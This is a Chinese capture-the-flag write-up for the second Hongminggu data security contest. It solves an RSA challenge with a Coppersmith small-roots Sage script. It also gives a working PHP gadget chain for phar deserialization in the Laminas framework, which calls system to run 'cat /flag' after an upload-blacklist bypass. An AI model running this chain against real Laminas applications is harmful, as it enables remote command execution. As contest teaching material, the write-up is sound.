---
title: 【WP】第二届"红明谷"杯数据安全大赛题目解析（一）
contest: 红明谷
year: 2022
difficulty: hard
vuln_type: crypto_rsa
tags: [Coppersmith-small-roots, RSA-padding, m=M+k*r, Zmod-polynomial, beta-0.03, phar-upload, Laminas-chain, TemplateMapResolver]
attack_chain: 1. RSA 加密 + 512 位素数 r + M = m%r + 32 位随机填充 /2. m 约 591 位 + r 512 位 + k 约 79 位 /3. 构造多项式 f=(M+x*r)^e - c 在 Zmod(n) 上找小根 k /4. k < 2^79 < n^(1/e) 用 Sage small_roots 求解 /5. 还原 m = M + k*r /6. phar 上传绕 + phar 反序列化 Laminas 链子
key_payload: Coppersmith small_roots X=2^100, beta=1, epsilon=0.03  phar 反序列化 LaminasViewResolver.TemplateMapResolver
one_liner: 第二届红明谷杯数据安全大赛题解（一），RSA Coppersmith 小根攻击 + phar 反序列化 Laminas 链。
lesson: m = M + k*r + 32 填充，k < n^(1/e) 是 Coppersmith 小根攻击标准配置；Laminas 框架 phar 反序列化链利用 TemplateMapResolver.setBody = system。
quality: high
---

# 【WP】第二届"红明谷"杯数据安全大赛题目解析（一）

## 概览
第二届红明谷杯数据安全大赛题解（第一部分），覆盖 RSA Coppersmith 小根攻击 + phar 反序列化 Laminas 链。

## 1. RSA (Coppersmith 小根攻击)

### 分析
- 加密前明文在末尾填充 32 位随机字符串
- `m = M + k*r`
- m 约 591 位，r 512 位，k 约 79 位
- 爆破 k 不可行
- 使用 Coppersmith 方法找小根 k

### 构造多项式
```python
#!sage
r = 7996728164495259362822258548434922741290100998149465194487628664864256950051236186227986990712837371289585870678059397413537714250530572338774305952904473
M = 4159518144549137412048572485195536187606187833861349516326031843059872501654790226936115271091120509781872925030241137272462161485445491493686121954785558
n = 131552964273731742744001439326470035414270864348139594004117959631286500198956302913377947920677525319260242121507196043323292374736595943942956194902814842206268870941485429339132421676367167621812260482624743821671183297023718573293452354284932348802548838847981916748951828826237112194142035380559020560287
e = 3
c = 46794664006708417132147941918719938365671485176293172014575392203162005813544444720181151046818648417346292288656741056411780813044749520725718927535262618317679844671500204720286218754536643881483749892207516758305694529993542296670281548111692443639662220578293714396224325591697834572209746048616144307282

P.<x> = PolynomialRing(Zmod(n))
f = (M + x*r)^e - c
k = f.monic().small_roots(X=2^100, beta=1, epsilon=0.03)[0]
m = M + k*r
print(bytes.fromhex(hex(m)[2:]))
```

### 关键
- `k < 2^79 < n^(1/e)` 是 Coppersmith 小根攻击条件
- `small_roots(X=2^100, beta=1, epsilon=0.03)` 是 Sage 调用

## 2. phar 上传绕 + phar 反序列化（Laminas 链子利用）

### POP 链
```php
<?php

namespace LaminasViewResolver{
    class TemplateMapResolver{
        protected $map = ["setBody"=>"system"];
    }
}
namespace LaminasViewRenderer{
    class PhpRenderer{
        private $__helpers;
        function __construct(){
            $this->__helpers = new LaminasViewResolverTemplateMapResolver();
        }
    }
}

namespace LaminasLogWriter{
    abstract class AbstractWriter{}

    class Mail extends AbstractWriter{
        protected $eventsToMail = ["cat /flag"];          //  cmd
        protected $subjectPrependText = null;
        protected $mail;
        function __construct(){
            $this->mail = new LaminasViewRendererPhpRenderer();
        }
    }
}

namespace LaminasLog{
    class Logger{
        protected $writers;
        function __construct(){
            $this->writers = [new LaminasLogWriterMail()];
        }
    }
}
```

### 攻击链
1. 上传 .phar 文件绕黑名单
2. `phar://` 协议触发反序列化
3. `Laminas\Log\Logger.__destruct` → `writers` 数组 → `Laminas\Log\Writer\Mail` → `mail` 字段 → `Laminas\View\Renderer\PhpRenderer` → `__helpers->setBody` → `system("cat /flag")`

## 经验提炼
- m = M + k*r + 32 填充，k < n^(1/e) 是 Coppersmith 小根攻击标准配置
- Laminas 框架 phar 反序列化链利用 TemplateMapResolver.setBody = system
- Sage `small_roots(X, beta, epsilon)` 是 LLL 格攻击接口
- 32 位随机填充是为了让 k 满足条件 `k < n^(1/e)`
- `f.monic()` 把多项式首一化
- phar 协议触发反序列化是 PHP 文件上传经典绕
- Laminas 框架原名 Zend Framework，反序列化链较多
- `setBody` 是 PhpRenderer 的虚函数
